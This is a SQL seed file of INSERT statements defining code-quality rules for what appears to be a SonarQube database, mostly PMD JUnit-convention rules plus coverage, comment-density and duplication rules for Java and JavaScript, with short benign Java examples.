INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (3, 'JUnit Use Expected', 'JUnitUseExpected', 'rulesets/java/migrating.xml/JUnitUseExpected', 'pmd-unit-tests', 'In JUnit4, use the @Test(expected) annotation to denote tests that should throw exceptions. Example: 
<pre>
public class MyTest {
	@Test
    public void testBad() {
        try {
            doSomething();
            fail("should have thrown an exception");
        } catch (Exception e) {
        }
    }

	@Test(expected=Exception.class)
    public void testGood() {
        doSomething();
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811235, 1510817811236, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (4, 'JUnit4 Suites Should Use Suite Annotation', 'JUnit4SuitesShouldUseSuiteAnnotation', 'rulesets/java/migrating.xml/JUnit4SuitesShouldUseSuiteAnnotation', 'pmd-unit-tests', 'In JUnit 3, test suites are indicated by the suite() method. In JUnit 4, suites are indicated
through the @RunWith(Suite.class) annotation. Example: 
<pre>
public class BadExample extends TestCase{

    public static Test suite(){
    	return new Suite();
    }
}

@RunWith(Suite.class)
@SuiteClasses( { TestOne.class, TestTwo.class })
public class GoodTest {
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811239, 1510817811241, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (5, 'JUnit assertions should include a message', 'JUnitAssertionsShouldIncludeMessage', 'rulesets/java/junit.xml/JUnitAssertionsShouldIncludeMessage', 'pmd-unit-tests', 'JUnit assertions should include a message - i.e., use the three argument version of assertEquals(), not the two argument version.
<pre>
public class Foo extends TestCase {
  public void testSomething() {
    assertEquals("foo", "bar"); // violation, should be assertEquals("Foo does not equals bar", "foo", "bar");
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S2698} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811244, 1510817811245, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (6, 'JUnit4 Test Should Use Before Annotation', 'JUnit4TestShouldUseBeforeAnnotation', 'rulesets/java/migrating.xml/JUnit4TestShouldUseBeforeAnnotation', 'pmd-unit-tests', 'In JUnit 3, the setUp method was used to set up all data entities required in running tests. 
JUnit 4 skips the setUp method and executes all methods annotated with @Before before all tests Example: 
<pre>
public class MyTest {
    public void setUp() {
        bad();
    }
}
public class MyTest2 {
    @Before public void setUp() {
        good();
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811249, 1510817811251, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (7, 'JUnit4 Test Should Use Test Annotation', 'JUnit4TestShouldUseTestAnnotation', 'rulesets/java/migrating.xml/JUnit4TestShouldUseTestAnnotation', 'pmd-unit-tests', 'In JUnit 3, the framework executed all methods which started with the word test as a unit test. 
In JUnit 4, only methods annotated with the @Test annotation are executed. Example: 
<pre>
public class MyTest {
    public void testBad() {
        doSomething();
    }

	@Test
    public void testGood() {
        doSomething();
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811253, 1510817811254, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (8, 'JUnit static suite', 'JUnitStaticSuite', 'rulesets/java/junit.xml/JUnitStaticSuite', 'pmd-unit-tests', 'The suite() method in a JUnit test needs to be both public and static.
<pre>
import junit.framework.*;

public class Foo extends TestCase {
  public void suite() {} // violation, should be static
  private static void suite() {} // violation, should be public
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811256, 1510817811258, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (9, 'Unnecessary boolean assertion', 'UnnecessaryBooleanAssertion', 'rulesets/java/junit.xml/UnnecessaryBooleanAssertion', 'pmd-unit-tests', 'A JUnit test assertion with a boolean literal is unnecessary since it always will eval to the same thing. Consider using flow control (in case of assertTrue(false) or similar) or simply removing statements like assertTrue(true) and assertFalse(false). If you just want a test to halt, use the fail method.
<pre>
public class SimpleTest extends TestCase {
  public void testX() {
    assertTrue(true); // violation
  }
}</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811276, 1510817811278, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (10, 'Simplify boolean assertion', 'SimplifyBooleanAssertion', 'rulesets/java/junit.xml/SimplifyBooleanAssertion', 'pmd-unit-tests', 'Avoid negation in an assertTrue or assertFalse test. For example, rephrase: assertTrue(!expr); as: assertFalse(expr);
<pre>
public class SimpleTest extends TestCase {
  public void testX() {
    assertTrue("not empty", !r.isEmpty()); // violation, replace with assertFalse("not empty", r.isEmpty())
    assertFalse(!r.isEmpty()); // violation, replace with assertTrue("empty", r.isEmpty())
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811280, 1510817811281, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (11, 'JUnit4 Test Should Use After Annotation', 'JUnit4TestShouldUseAfterAnnotation', 'rulesets/java/migrating.xml/JUnit4TestShouldUseAfterAnnotation', 'pmd-unit-tests', 'In JUnit 3, the tearDown method was used to clean up all data entities required in running tests. 
JUnit 4 skips the tearDown method and executes all methods annotated with @After after running each test Example: 
<pre>
public class MyTest {
    public void tearDown() {
        bad();
    }
}
public class MyTest2 {
    @After public void tearDown() {
        good();
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811282, 1510817811283, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (12, 'Use assertNull instead of assertTrue', 'UseAssertNullInsteadOfAssertTrue', 'rulesets/java/junit.xml/UseAssertNullInsteadOfAssertTrue', 'pmd-unit-tests', 'This rule detects JUnit assertions in object references equality. These assertions should be made by more specific methods, like assertNull, assertNotNull.
<pre>
public class FooTest extends TestCase {
  void testCode() {
    Object a = doSomething();

    assertTrue(a==null); // violation
    assertNull(a);  // good usage
    assertTrue(a != null); // violation
    assertNotNull(a);  // good usage
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811285, 1510817811285, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (41, 'Empty If Stmt', 'EmptyIfStmt', 'rulesets/java/empty.xml/EmptyIfStmt', 'pmd', '<p>
Empty If Statement finds instances where a condition is checked but nothing is done about it.
</p>

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811402, 1510817811403, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (42, 'Useless Overriding Method', 'UselessOverridingMethod', 'rulesets/java/unnecessary.xml/UselessOverridingMethod', 'pmd', 'The overriding method merely calls the same method defined in a superclass

<p>
This rule is deprecated, use {rule:squid:S1185} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811404, 1510817811405, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (43, 'Do Not Call System Exit', 'DoNotCallSystemExit', 'rulesets/java/j2ee.xml/DoNotCallSystemExit', 'pmd', 'Web applications should not call System.exit(), since only the web container or the application server should stop the JVM.

<p>
This rule is deprecated, use {rule:squid:S1147} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811408, 1510817811408, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (44, 'Missing Static Method In Non Instantiatable Class', 'MissingStaticMethodInNonInstantiatableClass', 'rulesets/java/design.xml/MissingStaticMethodInNonInstantiatableClass', 'pmd', 'A class that has private constructors and does not have any static methods or fields cannot be used.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811411, 1510817811411, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (45, 'Replace Hashtable With Map', 'ReplaceHashtableWithMap', 'rulesets/java/migrating.xml/ReplaceHashtableWithMap', 'pmd', 'Consider replacing this Hashtable with the newer java.util.Map

<p>
This rule is deprecated, use {rule:squid:S1149} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811412, 1510817811413, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (13, 'JUnit spelling', 'JUnitSpelling', 'rulesets/java/junit.xml/JUnitSpelling', 'pmd-unit-tests', 'Some JUnit framework methods are easy to misspell.
<pre>
import junit.framework.*;

public class Foo extends TestCase {
  public void setup() {} // violation, should be setUp()
  public void TearDown() {} // violation, should be tearDown()
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811287, 1510817811288, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (14, 'JUnit tests should include an assert', 'JUnitTestsShouldIncludeAssert', 'rulesets/java/junit.xml/JUnitTestsShouldIncludeAssert', 'pmd-unit-tests', 'JUnit tests should include at least one assertion. This makes the tests more robust, and using assert with messages provide the developer a clearer idea of what the test does.
<pre>
public class Foo extends TestCase {
  public void testSomething() {
    Bar b = findBar();
    b.work();
    // violation, we could use assertNotNull("bar not found", b);
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811289, 1510817811290, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (15, 'Use assertEquals instead of assertTrue', 'UseAssertEqualsInsteadOfAssertTrue', 'rulesets/java/junit.xml/UseAssertEqualsInsteadOfAssertTrue', 'pmd-unit-tests', 'This rule detects JUnit assertions in object equality. These assertions should be made by more specific methods, like assertEquals.
<pre>
public class FooTest extends TestCase {
  void testCode() {
    Object a, b;

    assertTrue(a.equals(b)); // violation
    assertEquals("a should equals b", a, b); // good usage
  }
}</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811292, 1510817811293, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (16, 'Test class without test cases (JUnit 3.x only)', 'TestClassWithoutTestCases', 'rulesets/java/junit.xml/TestClassWithoutTestCases', 'pmd-unit-tests', 'Test classes end with the suffix Test. Having a non-test class with that name is not a good practice, since most people will assume it is a test case. Test classes have test methods named testXXX.
Beware: This rule doesn''t support JUnit 4.x''s @Test annotation.
<pre>
public class CarTest { // violation, consider changing the name of the class if it is not a test
  // consider adding test methods if it is a test
  public static void main(String[] args) {
    // do something
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811294, 1510817811296, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (17, 'Use Assert True Instead Of Assert Equals', 'UseAssertTrueInsteadOfAssertEquals', 'rulesets/java/junit.xml/UseAssertTrueInsteadOfAssertEquals', 'pmd-unit-tests', 'When asserting a value is the same as a boolean literal, use assertTrue/assertFalse, instead of assertEquals. Example: 
<pre>
public class MyTestCase extends TestCase {
	public void testMyCase() {
		boolean myVar = true;
		// Ok
		assertTrue("myVar is true", myVar);
		// Bad
		assertEquals("myVar is true", true, myVar);
		// Bad
		assertEquals("myVar is false", false, myVar);
	}
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811303, 1510817811307, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (18, 'Branches should have sufficient coverage by unit tests', 'InsufficientBranchCoverage', NULL, 'common-js', 'An issue is created on a file as soon as the branch coverage on this file is less than the required threshold.It gives the number of branches to be covered in order to reach the required threshold.', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, 'number of uncovered conditions', NULL, 'bad-practice', false, 'HTML', 1510817811310, 1510817811312, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (19, 'Lines should have sufficient coverage by unit tests', 'InsufficientLineCoverage', NULL, 'common-js', 'An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'number of lines under the coverage threshold', NULL, 'bad-practice', false, 'HTML', 1510817811317, 1510817811318, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (20, 'Source files should have a sufficient density of comment lines', 'InsufficientCommentDensity', NULL, 'common-js', 'An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'number of lines required to meet minimum density', NULL, 'convention', false, 'HTML', 1510817811323, 1510817811324, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (21, 'Source files should not have any duplicated blocks', 'DuplicatedBlocks', NULL, 'common-js', 'An issue is created on a file as soon as there is at least one block of duplicated code on this file', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '10min', NULL, '10min', 'number of duplicate blocks', NULL, 'pitfall', false, 'HTML', 1510817811329, 1510817811330, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (22, 'Skipped unit tests should be either removed or fixed', 'SkippedUnitTests', NULL, 'common-js', 'Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'number of skipped tests', NULL, 'pitfall', false, 'HTML', 1510817811332, 1510817811333, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (23, 'Failed unit tests should be fixed', 'FailedUnitTests', NULL, 'common-js', 'Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'number of failed tests', NULL, NULL, false, 'HTML', 1510817811336, 1510817811337, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (47, 'Short Variable', 'ShortVariable', 'rulesets/java/naming.xml/ShortVariable', 'pmd', 'Detects when a field, local, or parameter has a very short name.

<p>
  This rule is deprecated, use {rule:squid:S00117} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811422, 1510817811423, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (48, 'Java5 migration - Byte instantiation', 'ByteInstantiation', 'rulesets/java/migrating.xml/ByteInstantiation', 'pmd', 'In JDK 1.5, calling new Byte() causes memory allocation. Byte.valueOf() is more memory friendly. Example :
<pre>
public class Foo {
private Byte i = new Byte(0); // change to Byte i =
Byte.valueOf(0);
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811426, 1510817811426, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (49, 'More Than One Logger', 'MoreThanOneLogger', 'rulesets/java/logging-java.xml/MoreThanOneLogger', 'pmd', 'Normally only one logger is used in each class.

<p>
This rule is deprecated, use {rule:squid:S1312} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811427, 1510817811428, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (74, 'Local Interface Session Naming Convention', 'LocalInterfaceSessionNamingConvention', 'rulesets/java/j2ee.xml/LocalInterfaceSessionNamingConvention', 'pmd', 'The Local Interface of a Session EJB should be suffixed by "Local".', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811510, 1510817811511, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (24, 'Branches should have sufficient coverage by unit tests', 'InsufficientBranchCoverage', NULL, 'common-java', 'An issue is created on a file as soon as the branch coverage on this file is less than the required threshold.It gives the number of branches to be covered in order to reach the required threshold.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, 'number of uncovered conditions', NULL, 'bad-practice', false, 'HTML', 1510817811339, 1510817811340, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (25, 'Lines should have sufficient coverage by unit tests', 'InsufficientLineCoverage', NULL, 'common-java', 'An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'number of lines under the coverage threshold', NULL, 'bad-practice', false, 'HTML', 1510817811350, 1510817811352, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (26, 'Source files should have a sufficient density of comment lines', 'InsufficientCommentDensity', NULL, 'common-java', 'An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'number of lines required to meet minimum density', NULL, 'convention', false, 'HTML', 1510817811356, 1510817811358, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (27, 'Source files should not have any duplicated blocks', 'DuplicatedBlocks', NULL, 'common-java', 'An issue is created on a file as soon as there is at least one block of duplicated code on this file', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '10min', NULL, '10min', 'number of duplicate blocks', NULL, 'pitfall', false, 'HTML', 1510817811361, 1510817811361, 1);
